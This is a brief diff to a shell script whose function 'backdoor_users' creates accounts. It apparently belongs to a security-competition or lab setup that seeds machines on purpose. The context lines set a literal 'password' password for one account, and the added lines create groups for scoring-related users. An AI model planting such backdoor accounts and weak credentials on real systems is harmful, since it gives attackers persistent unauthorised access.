@@ -43,6 +43,9 @@ backdoor_users(){
     echo -e "password\npassword" | passwd ucp
 
     # Normal users
+    groupadd -g 135 whiteteamer
+    groupadd -g 136 scoring
+    groupadd -g 137 scoringengine
     useradd -u 135 -g 135 -M whiteteamer -s /bin/bash
     useradd -u 136 -g 136 -M scoring -s /bin/bash
     useradd -u 137 -g 137 -M scoringengine -s /bin/bash 
